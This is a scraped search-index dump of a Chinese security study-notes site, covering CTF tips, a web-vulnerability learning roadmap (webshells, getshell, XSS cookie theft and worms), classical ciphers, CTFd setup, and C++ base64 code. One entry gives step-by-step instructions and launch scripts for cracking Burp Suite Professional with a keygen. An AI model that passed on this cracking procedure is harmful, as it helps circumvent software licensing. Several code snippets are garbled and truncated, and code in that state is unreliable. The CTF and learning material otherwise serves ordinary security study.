按f5进行反汇编 查看得到错误flag：flag{67ae31f0-0d35-4f36-a923-d8712883a5cb} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/Web漏洞/SQL注入.html":{"url":"3.网络安全/Web漏洞/SQL注入.html","title":"SQL注入","keywords":"","body":"一、SQL注入分类： 按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种： 1、UNION query SQL injection（可联合查询注入） 2、Stacked queries SQL injection（可多语句查询注入）堆叠查询 3、Boolean-based blind SQL injection（布尔型注入） 4、Error-based SQL injection（报错型注入） 5、Time-based blind SQL injection（基于时间延迟注入） 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/Web漏洞/WebShell原理.html":{"url":"3.网络安全/Web漏洞/WebShell原理.html","title":"WebShell原理","keywords":"","body":"赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/Web漏洞/文件上传.html":{"url":"3.网络安全/Web漏洞/文件上传.html","title":"文件上传","keywords":"","body":"赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/Web漏洞/重点学习漏洞.html":{"url":"3.网络安全/Web漏洞/重点学习漏洞.html","title":"重点学习漏洞","keywords":"","body":" (1) 了解产生sql注入的原理 (2) Union注入 (3) POST类型注入 (4) 万能用户 (5) 盲注 能力要求： 能够手工注入出任意表的数据，熟悉三种盲注的手法，能够通过sql注入实现任意文件读取和任意文件写入，能够自己编写一个不含sql注入的查询功能 文件上传 (1) 了解原理 (2) 会编写一句话木马 (3) 会用cmd命令吧一句话木马与图片结合 (4) 利用一句话木马getshell 能力要求： 会写php的webshell，明白webshell的原理，熟悉常见的文件上传绕过方法（如过后缀检测、过文件头检测、过MIME类型检测），能够自己编写一个不含漏洞的上传功能 文件包含 (1) 了解原理 (2) 会利用文件包含与文件上传文件相结合来getshell (3) 会访问容易文件 (4)file协议、php伪协议的利用 命令执行 (1) 了解原理 (2) 了解一些cmd的基本命令 (3) 知道哪些特殊字符有特殊作用 (4)php常见的代码执行（eval）、命令执行（system）函数 XSS (1) 了解原理 (2) 学一下javascript的基本语法 (3) 然后会利用xss获取cookie (4) 编写一个简单的xss蠕虫 CSRF (1) 了解原理 (2) 可以利用CSRF进行一些小操作(通过csrf让用户点击恶意链接就触发敏感操作) (3) 结合xss来利用 变量覆盖 (1) 了解原理 (2) 利用变量覆盖来getshell XEE (1) 了解一些XML的语法 (2) 了解原理 (3) 会用XEE来getshell之类的 反序列化 (1) 了解序列化 (2) 了解反序列化 (3) 了解POP链 逻辑漏洞 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/工具/Burp最新版破解.html":{"url":"3.网络安全/工具/Burp最新版破解.html","title":"Burp最新版破解","keywords":"","body":"我们首先需要三个东西 1、你破解的burp所需要的对应java版本，例如最新的2024.2.1版本的burp需要至少java18（我没记错的话），如何下载java并安装，我这里就不多说了，需要注意的是，这里并不需要强制你把java添加到环境变量，因为本文用的是绝对路径的方法写快捷启动。 2、你需要破解的burp版本的jar包，说到这个，有些师傅居然在群里找人发burp原版，靠。。。burp官方专业版下载地址： https://portswigger.net/burp/releases#professional 3、pwn3的注册机包以及某大佬的汉化包(我忘了id，有点长)，不知道啥是pwn3的，请看这篇文章： 你还在去公众号获取各种破解工具？看完这篇不需要了！ 这里我直接把注册机和汉化包下载链接放在后台，回复：240308 ok，准备好以上三个东西，我们开始操作 首先讲windows 我们把burp的jar包，以及注册机，放进同一个文件夹，注意路径不要有空格！ 然后我们右键新建txt文本，命名为你喜欢的名称，把txt后缀更改为vbs，然后使用文本编辑器打开它，填入下列命令： Dim ws, javaPath Set ws = CreateObject(\"WScript.Shell\") ' 这里替换成你的java路径 javaPath = \"C:\\Program Files\\Java21\\bin\\java.exe\" ws.Run \"\"\"\" & javaPath & \"\"\" --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED -javaagent:BurpLoaderKeygen.jar -javaagent:BurpSuiteChs.jar -javaagent:ja-netfilter.jar -noverify -Dsun.java2d.uiScale=1 -jar burpsuite_pro_v2024.2.1.jar\", 0 你不用管这些命令具体是干啥玩意儿的你只管用，把你的java对应的路径修改了就好，如果你不喜欢汉化，删掉-javaagent:BurpSuiteChs.jar即可。ps：此脚本没有cmd的启动黑框。 然后我们新建另一个vbs用于启动注册机，和上面同样的操作，命令修改为： Dim ws, javaPath Set ws = CreateObject(\"WScript.Shell\") ' 这里替换成你的java路径 javaPath = \"C:\\Program Files\\Java21\\bin\\java.exe\" ws.Run \"\"\"\" & javaPath & \"\"\" -jar BurpLoaderKeygen.jar\", 0 当然了你直接命令行打开也是一样的，我这里只是为了更新版本时重新打开注册机方便一些。 ok我们的准备工作完成，你现在文件夹里应该是这样的： 直接双击打开这俩vbs，你会得到如下两个东西： 接下来请按照图片的步骤，一步一步操作： 成功破解 现在你就可以正常使用burp了，之后的启动直接双击你命名的vbs即可，如果后续burp版本更新了，重复一遍此操作即可（注意你的jar包文件名）。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/工具/CTFd靶场搭建.html":{"url":"3.网络安全/工具/CTFd靶场搭建.html","title":"CTFd靶场搭建","keywords":"","body":"一、技术原理 二、前置需求下载安装 1、CTFd git clone https://github.com/CTFd/CTFd.git 2、ctfd-whale git clone https://github.com/glzjin/CTFd-Whale.git 3、frp 1）下载frp wget https://github.com/fatedier/frp/releases/download/v0.51.3/frp_0.51.3_linux_amd64.tar.gz tar -zxvf frp_0.51.3_linux_amd64.tar.gz cd ./frp_0.51.3_linux_amd64 mkdir /etc/frp cp frpc.ini frps.ini /etc/frp/ cp frpc frps /usr/bin/ chmod a+x /usr/bin/frpc /usr/bin/frps 2)添加指令单元快捷启动frps vim /usr/lib/systemd/system/frps.service 填入以下内容 [Unit] Description=frps After=network.target [Service] Type=simple WorkingDirectory=/usr/bin ExecStart=/usr/bin/frps -c /etc/frp/frps.ini Restart=on-failure [Install] WantedBy=multi-user.target 启动frps systemctl daemo-reload systemctl start frps systemctl enable frps 3)编辑配置文件 frps.ini [common] bind_port = 7897 bind_addr = 0.0.0.0 token = randomme # vhost_http_port = 80 # 如果要配置http动态域名则需要这个。80端口开启需要systemd使用root权限启用frp，在这里不需要 frpc.ini [common] token = thisistoken server_addr = 172.17.0.1 # 这里填写服务器ip addr之后docker0的ip地址 server_port = 7897 # 这里需与前面frps.ini的bind_port匹配 admin_addr = 172.1.0.4 # 这里填写frpc服务在frp网络中的ip admin_port = 7400 # 这里需要留至少一行空行，因为新的 Whale 会把容器的转发代理写到这个文件里，没留空行的话会影响 admin_port。 三、安装docker和docker-compose 1、安装docker yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo yum install -y docker-ce systemctl start docker systemctl enable docker 2、安装docker-compose yum install -y python3-pip pip3 install --upgrade pip pip3 install docker-compose chmod +x /usr/local/bin/docker-compose docker-compose --version 3、配置docker镜像加速 容器镜像服务 (aliyun.com) mkdir -p /etc/docker tee /etc/docker/daemon.json 4、配置docker集群 docker swarm init docker node update --label-add name=linux-1 $(docker node ls -q) 四、配置过程 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/理论知识/ASCII码.html":{"url":"3.网络安全/理论知识/ASCII码.html","title":"ASCII码","keywords":"","body":" 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/理论知识/CTF常见文件头.html":{"url":"3.网络安全/理论知识/CTF常见文件头.html","title":"CTF常见文件头","keywords":"","body":" 文件类型 文件头 ASCII码 文件尾 JPEG (jpg) FFD8FF \\ ÿØÿ\\ FF D9 PNG (png) 89504E47 \\ .PNG\\ AE 42 60 82 GIF (gif) 47494638 或GIF89A \\ GIF8\\ 00 3B ZIP Archive (zip) 504B0304 \\ PK..\\ 50 4B RAR Archive (rar) 52617221 \\ Rar!\\ bmp 424D \\ BM\\ HTML (html) 68746D6C3E \\ html>\\ Wave (wav) 57415645 \\ WAVE\\ AVI (avi) 41564920 \\ AVI \\ Email [thorough only] (eml) 44656C69766572792D646174653A \\ Delivery-date:\\ Adobe Acrobat (pdf) 255044462D312E \\ %PDF-1.\\ Photoshop (psd) 38425053 \\ 8BPS\\ XML (xml) 3C3F786D6C \\ 2.7版本文件头：03F3 0D0A 3.8版本文件头：550D 0D0A upx脱壳：upx.exe -d 文件路径 uncompyle6 pyc逆向：uncompyle6 -o pcat.py pcat.pyc pyinstxtractor：python pyinstxtractor exe文件 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/理论知识/CTF离谱密码总结.html":{"url":"3.网络安全/理论知识/CTF离谱密码总结.html","title":"CTF离谱密码总结","keywords":"","body":"零、工具箱总结 在线工具 - Bugku CTF 一、凯撒密码 在线加解密：凯撒(Caesar)加密/解密 - Bugku CTF 在密码学中，凯撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 下面是明文字母表移回3位的对比：明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 特定恺撒密码 根据偏移量的不同，还存在若干特定的恺撒密码名称： 偏移量为10：Avocat(A→K) 偏移量为13：ROT13 偏移量为-5：Cassis (K 6) 偏移量为-6：Cassette (K 7) C语言实现 #include #include #define MAX 255 void encode(char str[], int n){ int i, j, k; char min[26]={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}; char max[26]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}; for (i = 0; i = 'a' && str[i] = 'A' && str[i] = 'a' && str[i] = 'A' && str[i] 二、维吉尼亚密码 在线加解密：维吉尼亚加密/解密 - Bugku CTF 维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。 三、字母频率 在线加解密：字母频率在线分析 频率分析法指的是各个字母在文本材料中出现的频率。常被应用于密码学，尤其是可破解古典密码的频率分析。 四、培根密码 在线加解密：培根密码在线加密/解密 培根密码，又名倍康尼密码（英语：Bacon's cipher）是由法兰西斯·培根发明的一种隐写术。实际上就是一种替换密码，根据所给表一一对应转换即可加密解密 。它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏。 五、栅栏密码 在线加解密：栅栏加密/解密 - Bugku CTF 栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话），分为传统型与W型 明文举例：f5-lf5aa9gc9{-8648cbfb4f979c-c2a851d6e5-c} 标准型栅栏数为3加密后：flag{6cb9c256-5fac-4b47-a1ec-59988ff9c8d5} 六、QP(quoted-printable)编码 在线加解密：Quoted-printable在线编码 Quoted-printable 编码可译为“可打印字符引用编码”、“使用可打印字符的编码”，我们收邮件，查看信件原始信息，经常会看到这种类型的编码！ 七、ROT编码 在线加解密：凯撒(Caesar)加密/解密 - Bugku CTF ROT5、ROT13、ROT18、ROT47 编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。 实际就是凯撒密码不同的偏移量 下面分别说说它们的编码方式： ROT5是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。 ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。 ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。 ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码。 八、URL编码 在线编码：Url 编码/解码 - 在线工具 (toolhelper.cn) HTML URL 编码参考手册 (w3school.com.cn) 密文特点：%66%6C%61%67%7B%61%6E%64%20%31%3D%31%7D 九、BrainFuck编码/Ook!密码 在线加解密：Brainfuck/OoK加密解密 - Bugku CTF BrainFuck编码 Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的，是一种简单的、可以用最小的编译器来实现的、符合图灵完全思想的编程语言。这种语言由八种状态构成。 下面是这八种状态的描述，其中每个状态由一个字符标识： 字符 含义 > 指针加一 指针减一 + 指针指向的字节的值加一 - 指针指向的字节的值减一 . 输出指针指向的单元内容（ASCⅡ码） , 输入内容到指针指向的单元（ASCⅡ码） [ 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ] 如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 密文特点：+++++ +++++ [->++ +++++ +++++.+ +++++ .-- -- -.+++ +++.+++ ++ +++.---- ------- --.+. ----- -.++ +++++ ++ ++.-- --.-- ------- ----- .------.++ +++++ +.- -- --.++ +++.+ +++.- .++++ +++++++ +++. ----- -- ---.+ +++++ +.+++ ++.-- ----- .+++ +++++++ .--- ------- ----- .+++ +++++++ .--- ----.++ ++.-- -.--- -.++ +++++ ++ ++.-- ------- ----- ---.- --.+ +++++ ++ ..--- ------- --.-- -.+.+ ++.-- ---.+++++. ----- ----. +++ +++++ ++ +++++ +++++ +. 解密后：flag{671fb608-265a-492f-a041-b30bb8569490} Ook!密码 特征：所有明文转换成Ook.?! 十、摩斯密码 摩尔斯电码：.和-和间隔符或.和-和间隔符 密文举例：..-. .-.. .- --. . --... .---- -.-. .- ..... -.-. -.. -....- --... -.. -... ----. -....- ....- -... .- ...-- -....- ----. ...-- ---.. ...-- -....- .---- .- ..-. ---.. -.... --... ---.. ---.. .---- ..-. ----- --... 解密后：FLAGE71CA5CD-7DB9-4BA3-9383-1AF867881F07 十一、XXencode/UUencode编码 在线编码： XXencode加密/解密 - Bugku CTF UUencode加密/解密 - Bugku CTF UUencode的加密方式和base64很相似。但他的编码表有很多是特殊字符: !”#￥%&‘（）*+=’ 等等。 XXencode的加密方式也和base64相似。跟base64打印字符相比，就是比UUencode多一个 - 字符，少一个/ 字符。 特征举例： UUencode（1234567）= (,3(S-#4V-PH` 特征：看着特别奇怪 XXencode（1234567）= 6AH6nB1IqBkc+ 特征：与base64相似 XXencode密文举例：LNalVNrhIO4ZnLqZnLpVsAqtXA4FZTEc+ 解密后：flag{This_is_Xx3nc0de} 十二、社会主义核心价值观编码 在线编码：核心价值观编码 - Bugku CTF 没啥好说的，举例： 明文：flag{} 加密后：公正公正公正诚信文明公正民主公正法治法治诚信民主法治友善法治 十三、希尔密码 在线编码：希尔(Hill Cipher)加密/解密 - Bugku CTF 十四、Base家族编码 常见base base16： base32： base58： base64： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/Base64算法实现.html":{"url":"4.编程语言/C++/Base64算法实现.html","title":"Base64算法实现","keywords":"","body":"#include #include #include // base64 转换表, 共64个 static const char base64_alphabet[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; // 解码时使用 static const unsigned char base64_suffix_map[256] = { 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 62, 255, 255, 255, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 255, 255, 255, 254, 255, 255, 255, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 255, 255, 255, 255, 255, 255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255 }; static char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) { src >= rnum; // src = src >> rnum; return src; } int base64_encode(const char *indata, int inlen, char *outdata, int *outlen) { int ret = 0; // return value if (indata == NULL || inlen == 0) { return ret = -1; } int i; int in_len = 0; // 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数 int pad_num = 0; // 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, ) if (inlen % 3 != 0) { pad_num = 3 - inlen % 3; } in_len = inlen + pad_num; // 拼接后的长度, 实际编码需要的长度(3的倍数) int out_len = in_len * 8 / 6; // 编码后的长度 char *p = outdata; // 定义指针指向传出data的首地址 //编码, 长度为调整后的长度, 3字节一组 for (i = 0; i > 2; // 将indata第一个字符向右移动2bit(丢弃2bit) char c = base64_alphabet[value]; // 对应base64转换表的字符 *p = c; // 将对应字符(编码后字符)赋值给outdata第一字节 //处理最后一组(最后3字节)的数据 if (i == inlen + pad_num - 3 && pad_num != 0) { if(pad_num == 1) { *(p + 1) = base64_alphabet[(int)(cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4))]; *(p + 2) = base64_alphabet[(int)cmove_bits(*(indata + 1), 4, 2)]; *(p + 3) = '='; } else if (pad_num == 2) { // 编码后的数据要补两个 '=' *(p + 1) = base64_alphabet[(int)cmove_bits(*indata, 6, 2)]; *(p + 2) = '='; *(p + 3) = '='; } } else { // 处理正常的3字节的数据 *(p + 1) = base64_alphabet[cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4)]; *(p + 2) = base64_alphabet[cmove_bits(*(indata + 1), 4, 2) + cmove_bits(*(indata + 2), 0, 6)]; *(p + 3) = base64_alphabet[*(indata + 2) & 0x3f]; } p += 4; indata += 3; } if(outlen != NULL) { *outlen = out_len; } return ret; } int base64_decode(const char *indata, int inlen, char *outdata, int *outlen) { int ret = 0; if (indata == NULL || inlen >16)&0xff); if (g > 1) outdata[i++] = (unsigned char)((t>>8)&0xff); if (g > 2) outdata[i++] = (unsigned char)(t&0xff); y = t = 0; } } if (outlen != NULL) { *outlen = i; } return ret; } int main(){ char str1[] = \"enstr\"; char str2[] = \"Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9\"; //注意长度要给够 int len = 0; // base64_encode(str1,(int)strlen(str1),str2,&len); // printf(\"%s, len = %d\\n\", str2, len); char str3[64] = {0}; base64_decode(str2, (int)strlen(str2), str3, &len); printf(\"%s, len = %d\\n\", str3, len); return 0; } 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/Base64逆表生成.html":{"url":"4.编程语言/C++/Base64逆表生成.html","title":"Base64逆表生成","keywords":"","body":"#include #include using namespace std; int main(){ unsigned char encode_table[65] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; unsigned char decode_table[256], c; for (int i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/C++/C++基本语法.html":{"url":"4.编程语言/C++/C++基本语法.html","title":"CPlusPlus基本语法","keywords":"","body":"一、C++简介 C++ 是一种静态类型的、编译式的、通用的、大小写敏感的、不规则的编程语言，支持过程化编程、面向对象编程和泛型编程。 C++ 被认为是一种中级语言，它综合了高级语言和低级语言的特点。 C++ 是由 Bjarne Stroustrup 于 1979 年在新泽西州美利山贝尔实验室开始设计开发的。C++ 进一步扩充和完善了 C 语言，最初命名为带类的C，后来在 1983 年更名为 C++。 C++ 是 C 的一个超集，事实上，任何合法的 C 程序都是合法的 C++ 程序。 注意：使用静态类型的编程语言是在编译时执行类型检查，而不是在运行时执行类型检查。 面向对象程序设计 C++ 完全支持面向对象的程序设计，包括面向对象开发的四大特性： 封装（Encapsulation）：封装是将数据和方法组合在一起，对外部隐藏实现细节，只公开对外提供的接口。这样可以提高安全性、可靠性和灵活性。 继承（Inheritance）：继承是从已有类中派生出新类，新类具有已有类的属性和方法，并且可以扩展或修改这些属性和方法。这样可以提高代码的复用性和可扩展性。 多态（Polymorphism）：多态是指同一种操作作用于不同的对象，可以有不同的解释和实现。它可以通过接口或继承实现，可以提高代码的灵活性和可读性。 抽象（Abstraction）：抽象是从具体的实例中提取共同的特征，形成抽象类或接口，以便于代码的复用和扩展。抽象类和接口可以让程序员专注于高层次的设计和业务逻辑，而不必关注底层的实现细节。标准库 标准的 C++ 由三个重要部分组成： 核心语言，提供了所有构件块，包括变量、数据类型和常量，等等。 C++ 标准库，提供了大量的函数，用于操作文件、字符串等。 标准模板库（STL），提供了大量的方法，用于操作数据结构等。 二、C++基本语法 C++ 程序结构 让我们看一段简单的代码，可以输出单词 Hello World。 #include using namespace std; // main() 是程序开始执行的地方 int main() { cout C++ 语言定义了一些头文件，这些头文件包含了程序中必需的或有用的信息。上面这段程序中，包含了头文件 。 下一行 using namespace std; 告诉编译器使用 std 命名空间。命名空间是 C++ 中一个相对新的概念。 下一行 // main() 是程序开始执行的地方 是一个单行注释。单行注释以 // 开头，在行末结束。 下一行 int main() 是主函数，程序从这里开始执行。 下一行 cout 会在屏幕上显示消息 \"Hello World\"。 下一行 return 0; 终止 main( )函数，并向调用进程返回值 0。 C++注释 C++ 注释一般有两种： //：一般用于单行注释。 /* ... */：一般用于多行注释。 C++数据类型 C++ 为程序员提供了种类丰富的内置数据类型和用户自定义的数据类型。 下表列出了七种基本的 C++ 数据类型： 类型 关键字 布尔型 bool 字符型 char 整型 int 浮点型 float 双浮点型 double 无类型 void 宽字符型 wchar_t 其实 wchar_t 是这样来的： typedef short int wchar_t; 所以 wchar_t 实际上的空间是和 short int 一样。 一些基本类型可以使用一个或多个类型修饰符进行修饰： signed unsigned short longtypedef 声明 您可以使用 typedef 为一个已有的类型取一个新的名字。下面是使用 typedef 定义一个新类型的语法：typedef type newname; 例如，下面的语句会告诉编译器，feet 是 int 的另一个名称： typedef int feet; 现在，下面的声明是完全合法的，它创建了一个整型变量 distance： feet distance; 枚举类型 枚举类型(enumeration)是C++中的一种派生数据类型，它是由用户定义的若干枚举常量的集合。 如果一个变量只有几种可能的值，可以定义为枚举(enumeration)类型。所谓\"枚举\"是指将变量的值一一列举出来，变量的值只能在列举出来的值的范围内。 创建枚举，需要使用关键字 enum。枚举类型的一般形式为： enum 枚举名{ 标识符[=整型常数], 标识符[=整型常数], ... 标识符[=整型常数] } 枚举变量; 如果枚举没有初始化, 即省掉\"=整型常数\"时, 则从第一个标识符开始。 例如，下面的代码定义了一个颜色枚举，变量 c 的类型为 color。最后，c 被赋值为 \"blue\"。 enum color { red, green, blue } c; c = blue; 默认情况下，第一个名称的值为 0，第二个名称的值为 1，第三个名称的值为 2，以此类推。但是，您也可以给名称赋予一个特殊的值，只需要添加一个初始值即可。 例如，在下面的枚举中，green 的值为 5。 enum color { red, green=5, blue }; 在这里，blue 的值为 6，因为默认情况下，每个名称都会比它前面一个名称大 1，但 red 的值依然为 0。 类型转换 类型转换是将一个数据类型的值转换为另一种数据类型的值。 C++ 中有四种类型转换：静态转换、动态转换、常量转换和重新解释转换。 静态转换（Static Cast） 静态转换是将一种数据类型的值强制转换为另一种数据类型的值。 静态转换通常用于比较类型相似的对象之间的转换，例如将 int 类型转换为 float 类型。 静态转换不进行任何运行时类型检查，因此可能会导致运行时错误。 实例 int i = 10; float f = static_cast(i); // 静态将int类型转换为float类型 动态转换（Dynamic Cast） 动态转换通常用于将一个基类指针或引用转换为派生类指针或引用。动态转换在运行时进行类型检查，如果不能进行转换则返回空指针或引发异常。 实例 class Base {}; class Derived : public Base {}; Base* ptr_base = new Derived; Derived* ptr_derived = dynamic_cast(ptr_base); // 将基类指针转换为派生类指针 常量转换（Const Cast） 常量转换用于将 const 类型的对象转换为非 const 类型的对象。 常量转换只能用于转换掉 const 属性，不能改变对象的类型。 实例 const int i = 10; int& r = const_cast(i); // 常量转换，将const int转换为int 重新解释转换（Reinterpret Cast） 重新解释转换将一个数据类型的值重新解释为另一个数据类型的值，通常用于在不同的数据类型之间进行转换。 重新解释转换不进行任何类型检查，因此可能会导致未定义的行为。 实例 int i = 10; float f = reinterpret_cast(i); // 重新解释将int类型转换为float类型 三、C++变量类型 C++ 也允许定义各种其他类型的变量，比如枚举、指针、数组、引用、数据结构、类等等，这将会在后续的章节中进行讲解。 整数类型（Integer Types）： int：用于表示整数，通常占用4个字节。 short：用于表示短整数，通常占用2个字节。 long：用于表示长整数，通常占用4个字节。 long long：用于表示更长的整数，通常占用8个字节。 浮点类型（Floating-Point Types）： float：用于表示单精度浮点数，通常占用4个字节。 double：用于表示双精度浮点数，通常占用8个字节。 long double：用于表示更高精度的浮点数，占用字节数可以根据实现而变化。 字符类型（Character Types）： char：用于表示字符，通常占用1个字节。 wchar_t：用于表示宽字符，通常占用2或4个字节。 char16_t：用于表示16位Unicode字符，占用2个字节。 char32_t：用于表示32位Unicode字符，占用4个字节。 布尔类型（Boolean Type）： bool：用于表示布尔值，只能取true或false。 枚举类型（Enumeration Types）： enum：用于定义一组命名的整数常量。 指针类型（Pointer Types）： type*：用于表示指向类型为type的对象的指针。 数组类型（Array Types）： type[]或type[size]：用于表示具有相同类型的元素组成的数组。 结构体类型（Structure Types）： struct：用于定义包含多个不同类型成员的结构。 类类型（Class Types）： class：用于定义具有属性和方法的自定义类型。 共用体类型（Union Types）： union：用于定义一种特殊的数据类型，它可以在相同的内存位置存储不同的数据类型。 在 C++ 中，类型的长度（即占用的字节数）取决于编译器和计算机架构，然而，C++ 标准规定了不同整数类型的最小范围，而不是具体的字节数，这是为了确保代码在不同的系统上都能正确运行。 请注意，以上类型的范围只是 C++ 标准规定的最小要求，实际上，许多系统上这些类型可能占用更多的字节，例如，很多现代计算机上 int 通常占用 4 字节，而 long 可能占用 8 字节。 变量类型作用域 一般来说有三个地方可以定义变量： 在函数或一个代码块内部声明的变量，称为局部变量。 在函数参数的定义中声明的变量，称为形式参数。 在所有函数外部声明的变量，称为全局变量。 作用域是程序的一个区域，变量的作用域可以分为以下几种： 局部作用域：在函数内部声明的变量具有局部作用域，它们只能在函数内部访问。局部变量在函数每次被调用时被创建，在函数执行完后被销毁。 全局作用域：在所有函数和代码块之外声明的变量具有全局作用域，它们可以被程序中的任何函数访问。全局变量在程序开始时被创建，在程序结束时被销毁。 块作用域：在代码块内部声明的变量具有块作用域，它们只能在代码块内部访问。块作用域变量在代码块每次被执行时被创建，在代码块执行完后被销毁。 类作用域：在类内部声明的变量具有类作用域，它们可以被类的所有成员函数访问。类作用域变量的生命周期与类的生命周期相同。 注意： 如果在内部作用域中声明的变量与外部作用域中的变量同名，则内部作用域中的变量将覆盖外部作用域中的变量。 四、C++ 常量 常量是固定值，在程序执行期间不会改变。这些固定的值，又叫做字面量。 常量可以是任何的基本数据类型，可分为整型数字、浮点数字、字符、字符串和布尔值。 常量就像是常规的变量，只不过常量的值在定义后不能进行修改。 整数常量 整数常量可以是十进制、八进制或十六进制的常量。 前缀指定基数： 0x 或 0X 表示十六进制 0 表示八进制 不带前缀则默认表示十进制。 整数常量也可以带一个后缀，后缀是 U 和 L 的组合： U 表示无符号整数（unsigned） L 表示长整数（long）。 后缀可以是大写，也可以是小写，U 和 L 的顺序任意。 五、C++循环判断语句 C++循环判断语法与C语言相同 六、C++运算符 运算符是一种告诉编译器执行特定的数学或逻辑操作的符号。C++ 内置了丰富的运算符，并提供了以下类型的运算符： 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 杂项运算符 算术运算符 下表显示了 C++ 支持的算术运算符。 假设变量 A 